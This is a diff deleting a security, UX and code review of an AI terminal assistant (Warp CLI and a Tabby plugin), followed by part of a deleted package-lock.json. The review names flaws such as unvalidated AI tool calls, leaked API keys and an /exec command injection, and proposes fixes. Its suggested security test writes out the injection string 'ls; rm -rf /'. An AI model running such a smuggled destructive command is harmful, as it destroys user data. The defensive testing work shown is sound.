-// VULNERABLE: Tool names from AI without validation
-private extractToolCalls(response: string): any[] {
-  // Regex extracts tool names from AI response
-  // No validation before execution!
-}
-```
-
-**Fix:**
-```typescript
-private async executeToolCalls(toolCalls: any[]): Promise<any[]> {
-  const availableTools = await this.mcpClient.getAvailableTools();
-  const toolNames = new Set(availableTools.map(t => t.name));
-
-  for (const toolCall of toolCalls) {
-    // Validate tool exists
-    if (!toolNames.has(toolCall.tool)) {
-      throw new Error(`Unknown tool: ${toolCall.tool}`);
-    }
-
-    // Validate parameters against schema
-    const tool = availableTools.find(t => t.name === toolCall.tool);
-    validateParameters(toolCall.parameters, tool.schema);
-
-    // Execute with timeout
-    const result = await Promise.race([
-      this.mcpClient.executeTool(toolCall.tool, toolCall.parameters),
-      timeout(10000)
-    ]);
-  }
-}
-```
-
----
-
-#### ‚ö†Ô∏è HIGH #5: Secrets in Error Messages
-**Location:** Multiple locations
-
-```typescript
-// VULNERABLE
-throw new Error(`Provider error: ${providerConfig.apiKey} invalid`);
-```
-
-**Fix:**
-```typescript
-// Sanitize errors
-function sanitizeError(error: Error): string {
-  const message = error.message;
-
-  // Remove API keys
-  const sanitized = message
-    .replace(/sk-[a-zA-Z0-9]{32,}/g, '[REDACTED]')
-    .replace(/Bearer [a-zA-Z0-9._-]+/g, 'Bearer [REDACTED]')
-    .replace(/api[_-]?key[=:][a-zA-Z0-9]+/gi, 'api_key=[REDACTED]');
-
-  return sanitized;
-}
-```
-
----
-
-### 2.3 Medium Severity Issues
-
-| # | Issue | Location | Risk |
-|---|-------|----------|------|
-| 9 | FTS Search Injection | `session.storage.ts:229` | SQL injection via FTS MATCH |
-| 10 | No Command Whitelist | `handlers.ts:283` | Unrestricted command execution |
-| 11 | Session Autosave Race | `session.service.ts:132` | Data corruption |
-| 12 | Potential XSS | `ai-agent.service.ts` | HTML injection |
-| 13 | .env Not in .gitignore | `.gitignore` | Secret leakage |
-| 14 | Unencrypted HTTP | `ollama.provider.ts:10` | MITM attacks |
-| 15 | Env Vars to Subprocesses | `mcp-client.service.ts:232` | Secret leakage |
-
----
-
-### 2.4 Dependency Vulnerabilities
-
-**Tabby AI Agent:**
-```
-js-yaml <3.14.2 || >=4.0.0 <4.1.1
-‚îú‚îÄ Severity: moderate
-‚îú‚îÄ Prototype pollution vulnerability
-‚îî‚îÄ Fix: npm audit fix
-
-webpack-dev-server <=5.2.0
-‚îú‚îÄ Severity: moderate
-‚îú‚îÄ Source code theft vulnerability
-‚îî‚îÄ Fix: npm audit fix --force
-```
-
-**Warp CLI:**
-- ‚ö†Ô∏è `node-fetch@2.7.0` - Upgrade to 3.x (security improvements)
-- ‚ö†Ô∏è `sqlite3@5.1.7` - Check for CVEs
-
-**Action:** Run `npm audit` regularly and keep dependencies updated.
-
----
-
-## 3. USER EXPERIENCE REVIEW
-
-### 3.1 Developer Experience (Warp CLI) ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê (5/5)
-
-#### Strengths:
-‚úÖ **Excellent onboarding:**
-```bash
-warp setup  # Interactive wizard
-warp        # Start immediately
-```
-
-‚úÖ **Beautiful UI:**
-- Color-coded output
-- Loading spinners
-- Boxed messages
-- Markdown rendering
-- Streaming responses
-
-‚úÖ **Rich feature set:**
-- Multi-provider support
-- Session management
-- Full-text search
-- Export capabilities
-- Context awareness
-
-‚úÖ **Helpful commands:**
-```bash
-/help     # Clear documentation
-/explain  # Command explanations
-/suggest  # AI suggestions
-/stats    # Usage statistics
-```
-
-#### Minor Issues:
-- ‚ö†Ô∏è No inline help for commands (need to use `/help`)
-- ‚ö†Ô∏è No command autocomplete
-- ‚ö†Ô∏è No history navigation (‚Üë/‚Üì arrows)
-
----
-
-### 3.2 Plugin Experience (Tabby) ‚≠ê‚≠ê‚≠ê‚≠ê‚òÜ (4/5)
-
-#### Strengths:
-‚úÖ **Seamless integration** with Tabby terminal
-‚úÖ **Smart mode detection** - Auto-detect commands vs natural language
-‚úÖ **Multiple modes:**
-- `\ai` - AI mode
-- `\shell` - Shell mode
-- `\smart` - Auto-detect
-- `\toggle` - Cycle modes
-
-‚úÖ **MCP integration** - Tool use capabilities
-
-#### Issues:
-- ‚ö†Ô∏è **No visual mode indicator** - Hard to tell which mode you're in
-- ‚ö†Ô∏è **No undo for AI commands** - Dangerous if AI suggests bad commands
-- ‚ö†Ô∏è **Limited error feedback** - Errors not always clear
-- ‚ö†Ô∏è **No configuration UI** - Must edit config files manually
-
----
-
-### 3.3 Configuration & Setup ‚≠ê‚≠ê‚≠ê‚òÜ‚òÜ (3/5)
-
-#### Strengths:
-‚úÖ Interactive setup wizard
-‚úÖ Environment variable support
-‚úÖ Multiple providers
-‚úÖ Sensible defaults
-
-#### Issues:
-- ‚ùå **Manual API key entry** - Error-prone, insecure
-- ‚ùå **No config validation** - Invalid configs fail silently
-- ‚ùå **No provider testing** - Can't test if API key works
-- ‚ö†Ô∏è **Config location unclear** - Not documented well
-- ‚ö†Ô∏è **No config migration** - Breaking changes on updates
-
-**Recommendations:**
-```typescript
-// Add config validation
-warp config validate
-
-// Add provider testing
-warp config test-provider openai
-
-// Show config location
-warp config path
-
-// Interactive API key setup with masking
-warp config set-api-key openai
-> Enter OpenAI API key: ********
-‚úì API key validated and saved securely
-```
-
----
-
-### 3.4 Error Messages ‚≠ê‚≠ê‚≠ê‚òÜ‚òÜ (3/5)
-
-#### Good Examples:
-```
-‚úì Session saved: my-session (ID: abc123)
-‚ö† Command completed with warnings
-‚úó Provider not configured. Run: warp setup
-```
-
-#### Bad Examples:
-```typescript
-// Too technical
-"Error: ECONNREFUSED connect ECONNREFUSED 127.0.0.1:11434"
-
-// Not actionable
-"Chat error: Network error"
-
-// Leaks internals
-"Error at chat.service.ts:45:12"
-```
-
-**Better approach:**
-```typescript
-// User-friendly, actionable
-"Cannot connect to Ollama. Is it running?
-Try: brew services start ollama
-Or visit: https://ollama.ai/download"
-```
-
----
-
-## 4. DOCUMENTATION REVIEW
-
-### 4.1 README Quality ‚≠ê‚≠ê‚≠ê‚≠ê‚òÜ (4/5)
-
-**Root README.md:**
-- ‚úÖ Clear project description
-- ‚úÖ Quick start guide
-- ‚úÖ Project structure
-- ‚úÖ Development instructions
-- ‚ö†Ô∏è Missing architecture diagram
-- ‚ö†Ô∏è Missing troubleshooting section
-
-**Warp CLI README:**
-- ‚úÖ Comprehensive feature list
-- ‚úÖ Installation instructions
-- ‚úÖ Configuration guide
-- ‚úÖ Command reference
-- ‚ö†Ô∏è Missing performance tips
-- ‚ö†Ô∏è Missing common issues
-
-**Tabby Agent README:**
-- ‚úÖ Plugin installation
-- ‚úÖ MCP setup
-- ‚ö†Ô∏è Incomplete configuration docs
-- ‚ö†Ô∏è Missing examples
-
----
-
-### 4.2 Code Documentation ‚≠ê‚≠ê‚òÜ‚òÜ‚òÜ (2/5)
-
-#### Missing:
-- ‚ùå No JSDoc comments on public methods
-- ‚ùå No inline comments explaining complex logic
-- ‚ùå No architecture decision records (ADRs)
-- ‚ùå No API documentation
-
-**Recommendations:**
-```typescript
-/**
- * Executes a shell command with security restrictions.
- *
- * @param command - The command to execute (validated against whitelist)
- * @returns Promise resolving to command output
- * @throws {CommandNotAllowedError} If command not in whitelist
- * @throws {CommandTimeoutError} If command exceeds 10s timeout
- *
- * @example
- * const result = await executeCommand('git status');
- * console.log(result.output);
- *
- * @security Only whitelisted commands are allowed
- */
-async executeCommand(command: string): Promise<CommandResult>
-```
-
----
-
-### 4.3 Examples ‚≠ê‚≠ê‚≠ê‚≠ê‚òÜ (4/5)
-
-**Warp CLI:**
-- ‚úÖ `EXAMPLES.md` with comprehensive examples
-- ‚úÖ Common workflows documented
-- ‚úÖ Advanced usage patterns
-- ‚ö†Ô∏è Missing video demos
-- ‚ö†Ô∏è Missing integration examples
-
----
-
-## 5. TESTING REVIEW
-
-### 5.1 Test Coverage ‚≠ê‚≠ê‚òÜ‚òÜ‚òÜ (2/5)
-
-**Current State:**
-- ‚úÖ **Tabby Agent:** 3 test files found
-  - `ai-agent.service.test.ts`
-  - `mcp-client.service.test.ts`
-  - `context-manager.service.test.ts`
-- ‚ùå **Warp CLI:** No test files found
-
-**Test Quality (Tabby):**
-```typescript
-// Good: Mock setup
-jest.mock('@angular/core', () => ({
-  Injectable: () => (target: any) => target
-}));
-
-// Good: Tests core functionality
-it('should process natural language input successfully with Ollama', async () => {
-  // ...
-});
-
-// Missing: Edge cases
-// Missing: Error scenarios
-// Missing: Integration tests
-```
-
-**Coverage Estimate:** ~15-20%
-
----
-
-### 5.2 Test Recommendations
-
-**Priority 1 (Security):**
-```typescript
-describe('Command Execution Security', () => {
-  it('should reject command injection attempts', async () => {
-    await expect(
-      executeCommand('ls; rm -rf /')
-    ).rejects.toThrow('Command not allowed');
-  });
-
-  it('should sanitize API keys in error messages', () => {
-    const error = new Error('Invalid key: sk-abc123');
-    expect(sanitizeError(error)).not.toContain('sk-abc123');
-  });
-});
-```
-
-**Priority 2 (Core Functionality):**
-```typescript
-describe('Session Management', () => {
-  it('should save and load sessions correctly', async () => {
-    const session = await sessionService.createSession('test');
-    await sessionService.saveCurrentSession();
-    const loaded = await sessionService.loadSession(session.id);
-    expect(loaded).toEqual(session);
-  });
-
-  it('should search sessions with FTS', async () => {
-    const sessions = await sessionService.searchSessions('typescript');
-    expect(sessions.length).toBeGreaterThan(0);
-  });
-});
-```
-
-**Priority 3 (Integration):**
-```typescript
-describe('End-to-End', () => {
-  it('should complete a full chat session', async () => {
-    await chatService.initialize();
-    const response = await chatService.chat('Hello');
-    expect(response).toBeTruthy();
-  });
-});
-```
-
----
-
-## 6. FEATURE SUGGESTIONS
-
-### 6.1 High Priority Features
-
-#### 1. **Secure Secrets Management** üîê
-**Problem:** API keys stored in plaintext
-**Solution:**
-- Use OS keychain (macOS Keychain, Windows Credential Manager, Linux Secret Service)
-- Implement `keytar` or `node-keytar` for cross-platform support
-- Add key rotation capabilities
-- Support for environment-based key selection
-
-#### 2. **Interactive Command Approval** ‚úÖ
-**Problem:** `/exec` commands run without confirmation
-**Solution:**
-```typescript
-// Before executing dangerous commands
-const confirmed = await inquirer.prompt([{
-  type: 'confirm',
-  name: 'execute',
-  message: `Execute command: ${command}?`,
-  default: false
-}]);
-
-if (!confirmed.execute) {
-  return { output: 'Command cancelled by user' };
-}
-```
-
-#### 3. **Session Encryption** üîí
-**Problem:** Session data stored in plaintext SQLite
-**Solution:**
-```typescript
-import { createCipheriv, createDecipheriv } from 'crypto';
-
-class EncryptedSessionStorage {
-  private encryptionKey: Buffer;
-
-  async saveSession(session: Session): Promise<void> {
-    const encrypted = this.encrypt(JSON.stringify(session));
-    await this.db.run('INSERT INTO sessions ...', [encrypted]);
-  }
-
-  private encrypt(data: string): string {
-    const cipher = createCipheriv('aes-256-gcm', this.encryptionKey, iv);
-    return cipher.update(data, 'utf8', 'hex') + cipher.final('hex');
-  }
-}
-```
-
-#### 4. **Plugin System** üîå
-**Problem:** Hard to extend functionality
-**Solution:**
-```typescript
-// ~/.warp-cli/plugins/my-plugin/index.ts
-export default {
-  name: 'my-plugin',
-  commands: {
-    '/mycommand': async (args: string[]) => {
-      return 'Plugin output';
-    }
-  },
-  providers: {
-    'custom-llm': CustomLLMProvider
-  }
-};
-```
-
-#### 5. **Context File Loading** üìÅ
-**Problem:** Can't easily provide code files for context
-**Solution:**
-```typescript
-// Add context from files
-/context add src/main.ts
-/context add README.md
-/context list
-/context clear
-
-// Auto-detect relevant files
-/context auto  // Uses .gitignore, focuses on changed files
-```
-
----
-
-### 6.2 Medium Priority Features
-
-#### 6. **Diff View for AI Suggestions**
-```typescript
-// When AI suggests code changes
-/suggest "optimize this function"
-AI: Here's an optimized version:
-
-[Show side-by-side diff]
-- Old: for (let i = 0; i < arr.length; i++)
-+ New: for (const item of arr)
-
-Apply changes? [y/N]
-```
-
-#### 7. **Voice Input Support** üé§
-```typescript
-// Press Ctrl+V to start voice input
-warp> [üé§ Recording...]
-warp> "How do I list all git branches?"
-AI: You can use `git branch -a` to list all branches...
-```
-
-#### 8. **Code Analysis Tools**
-```typescript
-/analyze complexity src/main.ts
-/analyze security src/
-/analyze performance src/api.ts
-/refactor suggest src/legacy.ts
-```
-
-#### 9. **Team Collaboration**
-```typescript
-/session share abc123
-> Share URL: https://warp-cli.com/s/xyz789
-> Expires in: 24 hours
-> Anyone with this link can view (read-only)
-
-/session import https://warp-cli.com/s/xyz789
-```
-
-#### 10. **Custom Themes** üé®
-```typescript
-// ~/.warp-cli/themes/my-theme.json
-{
-  "colors": {
-    "primary": "#00ff00",
-    "error": "#ff0000",
-    "success": "#00ff00"
-  },
-  "ascii_art": "custom-logo.txt"
-}
-
-warp config theme my-theme
-```
-
----
-
-### 6.3 Low Priority / Nice-to-Have
-
-11. **Session Templates** - Pre-configured sessions for different tasks
-12. **AI Model Comparison** - Run same prompt on multiple providers
-13. **Cost Tracking** - Track API usage and costs per session
-14. **Session Analytics** - Insights into usage patterns
-15. **Multi-language Support** - i18n for UI messages
-
----
-
-## 7. CODING IMPROVEMENTS
-
-### 7.1 Dependency Injection
-
-**Current (Tight Coupling):**
-```typescript
-// services/chat.service.ts
-import { sessionService } from './session.service';
-import { contextService } from './context.service';
-
-export class ChatService {
-  async chat() {
-    sessionService.addMessage(...);
-    contextService.getContext();
-  }
-}
-```
-
-**Better (Dependency Injection):**
-```typescript
-// Use tsyringe or similar
-import { injectable, inject } from 'tsyringe';
-
-@injectable()
-export class ChatService {
-  constructor(
-    @inject('SessionService') private sessionService: SessionService,
-    @inject('ContextService') private contextService: ContextService
-  ) {}
-}
-
-// Makes testing much easier
-const mockSession = mock<SessionService>();
-const chatService = new ChatService(mockSession, mockContext);
-```
-
----
-
-### 7.2 Configuration Validation
-
-**Current:**
-```typescript
-const config = JSON.parse(configString);
-// No validation, can crash or have unexpected behavior
-```
-
-**Better:**
-```typescript
-import { z } from 'zod';
-
-const ConfigSchema = z.object({
-  defaultProvider: z.enum(['ollama', 'openai', 'anthropic', 'gemini']),
-  providers: z.record(z.object({
-    model: z.string().min(1),
-    apiKey: z.string().regex(/^sk-[a-zA-Z0-9]+$/).optional(),
-    endpoint: z.string().url().optional(),
-  })),
-  ui: z.object({
-    theme: z.enum(['dark', 'light']),
-    markdown: z.boolean(),
-    streaming: z.boolean()
-  })
-});
-
-type Config = z.infer<typeof ConfigSchema>;
-
-class ConfigService {
-  load(): Config {
-    const raw = JSON.parse(fs.readFileSync(this.configPath, 'utf8'));
-    return ConfigSchema.parse(raw);  // Throws if invalid
-  }
-}
-```
-
----
-
-### 7.3 Structured Logging
-
-**Current:**
-```typescript
-console.log('User message:', message);
-console.error('Error:', error);
-```
-
-**Better:**
-```typescript
-import { pino } from 'pino';
-
-const logger = pino({
-  level: process.env.LOG_LEVEL || 'info',
-  transport: {
-    target: 'pino-pretty',
-    options: { colorize: true }
-  }
-});
-
-// Structured logging with context
-logger.info({ sessionId, provider, model }, 'Starting chat session');
-logger.error({ error, sessionId }, 'Chat failed');
-
-// Automatically filters secrets
-logger.child({ apiKey: '[REDACTED]' });
-```
-
----
-
-### 7.4 Rate Limiting
-
-**Add rate limiting for API calls:**
-```typescript
-import Bottleneck from 'bottleneck';
-
-class RateLimitedProvider extends BaseLLMProvider {
-  private limiter = new Bottleneck({
-    maxConcurrent: 1,
-    minTime: 1000 / 60  // 60 requests per second
-  });
-
-  async chat(messages: Message[]): Promise<string> {
-    return this.limiter.schedule(() => this.actualChat(messages));
-  }
-}
-```
-
----
-
-### 7.5 Graceful Shutdown
-
-**Add proper cleanup:**
-```typescript
-// cli.ts
-process.on('SIGINT', async () => {
-  logger.info('Received SIGINT, shutting down gracefully...');
-
-  await sessionService.cleanup();
-  await storage.close();
-  await mcpClient.shutdown();
-
-  logger.info('Shutdown complete');
-  process.exit(0);
-});
-
-process.on('SIGTERM', async () => {
-  // Similar cleanup
-});
-```
-
----
-
-## 8. DEVELOPER PERSPECTIVE
-
-### 8.1 What's Great ‚úÖ
-
-1. **Clean Architecture** - Easy to navigate and understand
-2. **TypeScript Everywhere** - Type safety throughout
-3. **Good Abstractions** - Provider pattern makes adding LLMs easy
-4. **Rich Features** - Session management, search, export
-5. **Active Development** - Modern dependencies, recent commits
-
-### 8.2 What Needs Work ‚ö†Ô∏è
-
-1. **Security First** - Must fix critical vulnerabilities
-2. **Test Coverage** - Need comprehensive test suite
-3. **Documentation** - More inline comments and ADRs
-4. **Error Handling** - Better user-facing error messages
-5. **Configuration** - Validate and test configs
-
-### 8.3 Maintainability Score: 7/10
-
-**Pros:**
-- Clear code structure
-- Consistent naming
-- Good separation of concerns
-
-**Cons:**
-- Tight coupling (singletons)
-- Missing tests
-- No contribution guidelines
-- No CI/CD setup
-
----
-
-## 9. USER PERSPECTIVE
-
-### 9.1 What Users Will Love ‚ù§Ô∏è
-
-1. **Easy Setup** - `warp setup` just works
-2. **Fast** - Streaming responses feel snappy
-3. **Context Aware** - Understands git status, project type
-4. **Multi-Provider** - Can switch between Ollama, OpenAI, etc.
-5. **Session Management** - Resume conversations
-6. **Beautiful UI** - Clean, colorful, modern
-
-### 9.2 What Users Will Struggle With üòï
-
-1. **Security Concerns** - Storing API keys in plaintext
-2. **Setup Complexity** - Need to configure providers manually
-3. **No Visual Feedback** - Hard to know when AI is thinking (non-streaming)
-4. **Error Messages** - Sometimes too technical
-5. **No Undo** - Can't undo AI suggestions
-6. **Limited Help** - Need to remember commands
-
-### 9.3 User Satisfaction: 7/10
-
-**Would users recommend this?** Probably yes, BUT:
-- Must fix security issues first
-- Need better error messages
-- More inline help
-
----
-
-## 10. COMPARISON TO COMPETITORS
-
-### vs Warp.dev
-- ‚úÖ **Advantage:** Open source, self-hosted
-- ‚úÖ **Advantage:** Multi-provider support
-- ‚ùå **Disadvantage:** Less polished UI
-- ‚ùå **Disadvantage:** Fewer features
-
-### vs GitHub Copilot CLI
-- ‚úÖ **Advantage:** Session management
-- ‚úÖ **Advantage:** More context awareness
-- ‚ùå **Disadvantage:** No IDE integration
-- ‚ùå **Disadvantage:** Smaller model selection
-
-### vs Cursor
-- ‚úÖ **Advantage:** Terminal-focused
-- ‚úÖ **Advantage:** Lightweight
-- ‚ùå **Disadvantage:** No code editing
-- ‚ùå **Disadvantage:** No git integration in UI
-
----
-
-## 11. PRIORITIZED ACTION PLAN
-
-### üî¥ URGENT (Completed 2025-11-18)
-
-**Security Fixes:**
-- [x] Fix RCE vulnerability (`/exec` command)
-- [x] Move Gemini API key to headers
-- [x] Implement OS keychain for API keys
-- [x] Filter `process.env` before storing
-
-**Quick Wins:**
-- [x] Add `.env` to `.gitignore`
-- [x] Sanitize error messages
-- [x] Add input validation on commands
-
----
-
-### üü° HIGH PRIORITY (Completed/In Progress)
-
-**Security:**
-- [x] Implement session encryption
-- [x] Add JSON schema validation
-- [ ] Fix MCP environment variable leakage
-- [x] Add rate limiting
-
-**Features:**
-- [x] Interactive command approval
-- [x] Config validation command
-- [ ] Provider testing command
-
-**Testing:**
-- [ ] Add security tests
-- [ ] Add unit tests for core services
-- [ ] Set up CI/CD
-
----
-
-### üü¢ MEDIUM PRIORITY (In Progress)
-
-**Features:**
-- [x] Plugin system
-- [x] Context file loading
-- [ ] Diff view for suggestions
-- [ ] Custom themes
-
-**Documentation:**
-- [ ] Add JSDoc comments
-- [ ] Write architecture guide
-- [ ] Create troubleshooting guide
-- [ ] Add video tutorials
-
-**Quality:**
-- [x] Refactor to use DI
-- [ ] Add integration tests
-- [ ] Performance optimization
-- [ ] Add monitoring
-
----
-
-### üîµ LOW PRIORITY (Future)
-
-- [ ] Voice input
-- [ ] Team collaboration
-- [ ] Session templates
-- [ ] Cost tracking
-- [ ] Analytics dashboard
-- [ ] Multi-language support
-
----
-
-## 12. FINAL RECOMMENDATIONS
-
-### For Immediate Production Use:
-‚úÖ **SECURITY ISSUES ADDRESSED** ‚Äî Critical vulnerabilities have been fixed as of 2025-11-18 (build: v1.4.2). However, comprehensive testing is still recommended before production deployment.
-
-### ‚úÖ NOW SUITABLE for:
-- Personal projects
-- Learning/experimentation
-- Local development
-- Non-sensitive codebases
-‚ö†Ô∏è **ADDITIONAL TESTING RECOMMENDED** for:
-- Production systems
-- Sensitive codebases
-- Enterprise use (security audit recommended)
-- Multi-user environments
-
----
-
-## 13. CONCLUSION
-
-This is a **well-designed, feature-rich AI coding assistant** with excellent architecture and developer experience. The codebase demonstrates strong engineering practices and modern TypeScript usage.
-
-**As of 2025-11-18**, the **critical security vulnerabilities have been addressed** through comprehensive remediation work documented in SECURITY-REMEDIATION-LOG.md. The command injection vulnerability (CVSS 9.8) and other critical issues have been fixed.
-
-### Overall Score: 7/10 ‚Üí 8.5/10 (Post-Remediation)
-
-**Breakdown:**
-- Architecture: 8/10
-- Code Quality: 7/10
-- Security: 3/10 ‚Üí 8/10 üü¢ **(Significantly Improved)**
-- Features: 9/10
-- Documentation: 6/10
-- Testing: 3/10
-- UX: 8/10
-
-### Updated Recommendation:
-The **security issues have been fixed** and the project is now suitable for most use cases. With comprehensive testing, this is a solid 8.5/10 project ready for production use.
-
----
-
-## Appendix: Quick Reference
-
-### Security Checklist
-- [x] RCE vulnerability fixed
-- [x] API keys in OS keychain
-- [x] Sessions encrypted
-- [x] Input validation everywhere
-- [x] Error messages sanitized
-- [x] JSON schema validation
-- [x] Rate limiting implemented
-- [ ] Audit logging added
-
-### Testing Checklist
-- [ ] Unit tests >80% coverage
-- [ ] Integration tests
-- [ ] Security tests
-- [ ] E2E tests
-- [ ] Performance tests
-- [ ] CI/CD pipeline
-
-### Documentation Checklist
-- [ ] JSDoc on all public APIs
-- [ ] Architecture diagrams
-- [ ] Troubleshooting guide
-- [ ] Contributing guidelines
-- [ ] Security policy
-- [ ] Change log
-
----
-
-**End of Review**
-
diff --git a/package-lock.json b/package-lock.json
deleted file mode 100644
index b82dc6e..0000000
--- a/package-lock.json
+++ /dev/null
@@ -1,423 +0,0 @@
-{
-  "name": "aicli",
-  "lockfileVersion": 3,
-  "requires": true,
-  "packages": {
-    "": {
-      "dependencies": {
-        "keytar": "^7.9.0",
-        "zod": "^4.1.12"
-      }
-    },
-    "node_modules/base64-js": {
-      "version": "1.5.1",
-      "resolved": "https://registry.npmjs.org/base64-js/-/base64-js-1.5.1.tgz",
-      "integrity": "sha512-AKpaYlHn8t4SVbOHCy+b5+KKgvR4vrsD8vbvrbiQJps7fKDTkjkDry6ji0rUJjC0kzbNePLwzxq8iypo41qeWA==",
-      "funding": [
-        {
-          "type": "github",
-          "url": "https://github.com/sponsors/feross"
-        },
-        {
-          "type": "patreon",
-          "url": "https://www.patreon.com/feross"
-        },
-        {
-          "type": "consulting",
-          "url": "https://feross.org/support"
-        }
-      ]
-    },
-    "node_modules/bl": {
-      "version": "4.1.0",
-      "resolved": "https://registry.npmjs.org/bl/-/bl-4.1.0.tgz",
-      "integrity": "sha512-1W07cM9gS6DcLperZfFSj+bWLtaPGSOHWhPiGzXmvVJbRLdG82sH/Kn8EtW1VqWVA54AKf2h5k5BbnIbwF3h6w==",
-      "dependencies": {
-        "buffer": "^5.5.0",
-        "inherits": "^2.0.4",
-        "readable-stream": "^3.4.0"
-      }
-    },
-    "node_modules/buffer": {
-      "version": "5.7.1",
-      "resolved": "https://registry.npmjs.org/buffer/-/buffer-5.7.1.tgz",
-      "integrity": "sha512-EHcyIPBQ4BSGlvjB16k5KgAJ27CIsHY/2JBmCRReo48y9rQ3MaUzWX3KVlBa4U7MyX02HdVj0K7C3WaB3ju7FQ==",
-      "funding": [
-        {
-          "type": "github",
-          "url": "https://github.com/sponsors/feross"
-        },
-        {
-          "type": "patreon",
-          "url": "https://www.patreon.com/feross"
-        },
-        {
-          "type": "consulting",
-          "url": "https://feross.org/support"
-        }
-      ],
-      "dependencies": {
-        "base64-js": "^1.3.1",
-        "ieee754": "^1.1.13"
-      }
-    },
-    "node_modules/chownr": {
-      "version": "1.1.4",
-      "resolved": "https://registry.npmjs.org/chownr/-/chownr-1.1.4.tgz",
-      "integrity": "sha512-jJ0bqzaylmJtVnNgzTeSOs8DPavpbYgEr/b0YL8/2GO3xJEhInFmhKMUnEJQjZumK7KXGFhUy89PrsJWlakBVg=="
-    },
-    "node_modules/decompress-response": {
-      "version": "6.0.0",
-      "resolved": "https://registry.npmjs.org/decompress-response/-/decompress-response-6.0.0.tgz",
-      "integrity": "sha512-aW35yZM6Bb/4oJlZncMH2LCoZtJXTRxES17vE3hoRiowU2kWHaJKFkSBDnDR+cm9J+9QhXmREyIfv0pji9ejCQ==",
-      "dependencies": {
-        "mimic-response": "^3.1.0"
-      },
-      "engines": {
-        "node": ">=10"
-      },
-      "funding": {
-        "url": "https://github.com/sponsors/sindresorhus"
-      }
-    },
-    "node_modules/deep-extend": {
-      "version": "0.6.0",
-      "resolved": "https://registry.npmjs.org/deep-extend/-/deep-extend-0.6.0.tgz",
-      "integrity": "sha512-LOHxIOaPYdHlJRtCQfDIVZtfw/ufM8+rVj649RIHzcm/vGwQRXFt6OPqIFWsm2XEMrNIEtWR64sY1LEKD2vAOA==",
-      "engines": {
-        "node": ">=4.0.0"
-      }
-    },
-    "node_modules/detect-libc": {
-      "version": "2.1.2",
-      "resolved": "https://registry.npmjs.org/detect-libc/-/detect-libc-2.1.2.tgz",
-      "integrity": "sha512-Btj2BOOO83o3WyH59e8MgXsxEQVcarkUOpEYrubB0urwnN10yQ364rsiByU11nZlqWYZm05i/of7io4mzihBtQ==",
-      "engines": {
-        "node": ">=8"
-      }
-    },
-    "node_modules/end-of-stream": {
-      "version": "1.4.5",
-      "resolved": "https://registry.npmjs.org/end-of-stream/-/end-of-stream-1.4.5.tgz",
-      "integrity": "sha512-ooEGc6HP26xXq/N+GCGOT0JKCLDGrq2bQUZrQ7gyrJiZANJ/8YDTxTpQBXGMn+WbIQXNVpyWymm7KYVICQnyOg==",
-      "dependencies": {
-        "once": "^1.4.0"
-      }
-    },
-    "node_modules/expand-template": {
-      "version": "2.0.3",
-      "resolved": "https://registry.npmjs.org/expand-template/-/expand-template-2.0.3.tgz",
-      "integrity": "sha512-XYfuKMvj4O35f/pOXLObndIRvyQ+/+6AhODh+OKWj9S9498pHHn/IMszH+gt0fBCRWMNfk1ZSp5x3AifmnI2vg==",
-      "engines": {
-        "node": ">=6"
-      }
-    },
-    "node_modules/fs-constants": {
-      "version": "1.0.0",
-      "resolved": "https://registry.npmjs.org/fs-constants/-/fs-constants-1.0.0.tgz",
-      "integrity": "sha512-y6OAwoSIf7FyjMIv94u+b5rdheZEjzR63GTyZJm5qh4Bi+2YgwLCcI/fPFZkL5PSixOt6ZNKm+w+Hfp/Bciwow=="
-    },
-    "node_modules/github-from-package": {
-      "version": "0.0.0",
-      "resolved": "https://registry.npmjs.org/github-from-package/-/github-from-package-0.0.0.tgz",
-      "integrity": "sha512-SyHy3T1v2NUXn29OsWdxmK6RwHD+vkj3v8en8AOBZ1wBQ/hCAQ5bAQTD02kW4W9tUp/3Qh6J8r9EvntiyCmOOw=="
-    },
-    "node_modules/ieee754": {
-      "version": "1.2.1",
-      "resolved": "https://registry.npmjs.org/ieee754/-/ieee754-1.2.1.tgz",
-      "integrity": "sha512-dcyqhDvX1C46lXZcVqCpK+FtMRQVdIMN6/Df5js2zouUsqG7I6sFxitIC+7KYK29KdXOLHdu9zL4sFnoVQnqaA==",
-      "funding": [
-        {
-          "type": "github",
-          "url": "https://github.com/sponsors/feross"
-        },
-        {
-          "type": "patreon",
-          "url": "https://www.patreon.com/feross"
-        },
-        {
-          "type": "consulting",
-          "url": "https://feross.org/support"
-        }
-      ]
-    },
-    "node_modules/inherits": {
-      "version": "2.0.4",
-      "resolved": "https://registry.npmjs.org/inherits/-/inherits-2.0.4.tgz",
-      "integrity": "sha512-k/vGaX4/Yla3WzyMCvTQOXYeIHvqOKtnqBduzTHpzpQZzAskKMhZ2K+EnBiSM9zGSoIFeMpXKxa4dYeZIQqewQ=="
-    },
-    "node_modules/ini": {
-      "version": "1.3.8",
-      "resolved": "https://registry.npmjs.org/ini/-/ini-1.3.8.tgz",
-      "integrity": "sha512-JV/yugV2uzW5iMRSiZAyDtQd+nxtUnjeLt0acNdw98kKLrvuRVyB80tsREOE7yvGVgalhZ6RNXCmEHkUKBKxew=="
-    },
-    "node_modules/keytar": {
-      "version": "7.9.0",
-      "resolved": "https://registry.npmjs.org/keytar/-/keytar-7.9.0.tgz",
-      "integrity": "sha512-VPD8mtVtm5JNtA2AErl6Chp06JBfy7diFQ7TQQhdpWOl6MrCRB+eRbvAZUsbGQS9kiMq0coJsy0W0vHpDCkWsQ==",
-      "hasInstallScript": true,
-      "dependencies": {
-        "node-addon-api": "^4.3.0",
-        "prebuild-install": "^7.0.1"
-      }
-    },
-    "node_modules/mimic-response": {
-      "version": "3.1.0",
-      "resolved": "https://registry.npmjs.org/mimic-response/-/mimic-response-3.1.0.tgz",
-      "integrity": "sha512-z0yWI+4FDrrweS8Zmt4Ej5HdJmky15+L2e6Wgn3+iK5fWzb6T3fhNFq2+MeTRb064c6Wr4N/wv0DzQTjNzHNGQ==",
-      "engines": {
-        "node": ">=10"
-      },
-      "funding": {
-        "url": "https://github.com/sponsors/sindresorhus"
-      }
-    },
-    "node_modules/minimist": {
-      "version": "1.2.8",
-      "resolved": "https://registry.npmjs.org/minimist/-/minimist-1.2.8.tgz",
-      "integrity": "sha512-2yyAR8qBkN3YuheJanUpWC5U3bb5osDywNB8RzDVlDwDHbocAJveqqj1u8+SVD7jkWT4yvsHCpWqqWqAxb0zCA==",
-      "funding": {
-        "url": "https://github.com/sponsors/ljharb"
-      }
-    },
-    "node_modules/mkdirp-classic": {
-      "version": "0.5.3",
